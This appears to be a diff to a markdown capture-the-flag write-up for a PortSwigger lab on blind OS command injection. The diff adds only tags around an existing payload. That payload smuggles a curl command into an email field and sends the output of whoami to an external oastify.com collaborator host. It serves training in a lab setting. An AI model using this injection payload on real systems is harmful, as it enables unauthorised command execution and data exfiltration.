@@ -4,6 +4,8 @@ title: "5 - Blind OS command injection with out-of-band data exfiltration"
 
 # 5 - Blind OS command injection with out-of-band data exfiltration
 
+#rce #infodisclosure #portswigger #writeup
+
 ```bash
 email=test%40test.com||curl+"http://zwz8rzx8skcv9qkhk1n23ssan1tvhoec3.oastify.com?cmd=$(whoami)"||
 ```
